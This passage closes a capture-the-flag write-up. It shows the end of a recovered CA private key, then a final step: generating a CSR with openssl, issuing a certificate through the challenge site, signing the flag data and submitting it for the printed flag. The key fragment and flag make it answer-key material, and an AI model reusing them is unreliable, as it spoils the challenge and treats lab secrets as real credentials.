ylpvuoJWZ1bRqJY4tNdXTTS/023foHnuTQ==
-----END PRIVATE KEY-----
```

### Step 8. Summing it all up

Now we're finally ready to complete the challenge. 

Firstly we generate a CSR with
```
$ openssl req -new -key pkey.key
```
Where pkey.key is a file containing the `MasterShackle Flag SubCA` private key.

With this we can navigate to `/mastercrypt/issuecert` and generate a certificate. We must be logged in with the correct username in order to select the `MasterShackle Flag SubCA` from the dropdown. 

Then, we navigate to the `/flag` page. We copy the data and pass it to `/mastercrypt/sign` along with the `MasterShackle Flag SubCA` private key. This output is 'Signed data' that goes into `/flag`.

Once we have the certificate and the signed data we can go back to the `/flag` page, paste them in and get the flag
```
flag{Upfmnhx1/KsMmrxfYGiLLTicLvMc2YTqV4ivOHWTIsKHqcUsJIuOTFJ2njd2ueOCgf7jrIVahuyU948z3lUM2A==}
```

